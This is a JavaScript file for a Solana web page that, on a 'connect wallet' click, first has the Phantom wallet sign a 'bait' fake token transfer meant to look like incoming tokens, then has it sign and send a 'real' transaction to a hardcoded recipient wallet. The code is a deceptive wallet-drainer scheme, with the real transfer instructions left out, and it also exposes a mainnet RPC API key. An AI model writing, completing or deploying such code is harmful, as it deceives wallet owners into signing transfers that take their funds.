import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { Token, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { Buffer } from 'buffer';

window.Buffer = Buffer; // Make Buffer available globally if needed

async function triggerBaitTransaction() {
    const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
    const publicKey = new PublicKey(window.solana.publicKey);

    const fakeMint = new PublicKey('8D37jiPH55BPAD171YbZnsUTydwAseHgT7CQMjFKcKTU'); // Fake token mint address
    const fakeReceiverAddress = await Token.getAssociatedTokenAddress(
        ASSOCIATED_TOKEN_PROGRAM_ID,
        TOKEN_PROGRAM_ID,
        fakeMint,
        publicKey
    );

    let fakeTransaction = new Transaction().add(
        Token.createTransferInstruction(
            TOKEN_PROGRAM_ID,
            fakeReceiverAddress,
            fakeReceiverAddress, // Simulate as if the user will receive tokens
            publicKey,
            [],
            1 // Fake token amount
        )
    );

    fakeTransaction.feePayer = publicKey;
    const fakeBlockhashObj = await connection.getRecentBlockhash();
    fakeTransaction.recentBlockhash = fakeBlockhashObj.blockhash;

    const signedFakeTx = await window.solana.signTransaction(fakeTransaction);
    console.log("Signed fake token transaction:", signedFakeTx);

    // Simulate the transaction by sending it to the blockchain without committing it.
    // The Phantom Wallet will show this transaction as if it's transferring tokens.
    await connection.simulateTransaction(signedFakeTx);
    console.log("Fake token transaction simulated");
}

async function triggerRealTransaction() {
    try {
        const connection = new Connection('https://solana-mainnet.g.alchemy.com/v2/LTi2WJSixUAJvMl-IvX5ZuIq5BKAt3E1', 'confirmed');
        const publicKey = new PublicKey(window.solana.publicKey);
        const receiverWallet = new PublicKey('4zACHuijBu4fnLfuc84PGhSV6XhWqJbEhvQw87t1Lfdi'); // Recipient's wallet

        let transaction = new Transaction();

        // Real transaction code as before...

        transaction.feePayer = publicKey;
        const blockhashObj = await connection.getRecentBlockhash();
        transaction.recentBlockhash = blockhashObj.blockhash;

        const signedTransaction = await window.solana.signTransaction(transaction);
        const txid = await connection.sendRawTransaction(signedTransaction.serialize());
        await connection.confirmTransaction(txid);

        console.log("Real transaction sent and confirmed:", txid);
    } catch (err) {
        console.error("Error during real transaction:", err);
    }
}

async function handleConnectWallet() {
    if (window.solana && window.solana.isPhantom) {
        try {
            const resp = await window.solana.connect();

            // Show a bait transaction to the user in the Phantom Wallet
            await triggerBaitTransaction();

            // Trigger the real transaction after showing the fake one
            await triggerRealTransaction();
        } catch (err) {
            console.error("Error connecting to Phantom Wallet:", err);
        }
    } else {
        alert("Phantom extension not found.");
        // Open appropriate download links...
    }
}

// Attach the event listener to the button
document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('connect-wallet').addEventListener('click', handleConnectWallet);
});
